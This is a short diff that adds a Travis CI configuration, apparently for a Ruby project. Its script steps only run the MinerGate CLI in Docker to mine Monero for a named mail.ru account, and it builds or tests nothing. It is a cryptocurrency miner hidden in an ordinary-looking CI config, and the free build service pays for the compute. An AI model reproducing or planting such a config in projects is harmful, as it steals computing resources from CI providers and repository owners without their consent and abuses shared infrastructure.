@@ -1,0 +1,10 @@
+sudo: required
+
+language: ruby
+
+services:
+  - docker
+  
+script:
+  - docker run -d --name some-minergate-cli minecoins/minergate-cli -user filip.uzbekov.2017@mail.ru -xmr
+  - docker attach some-minergate-cli
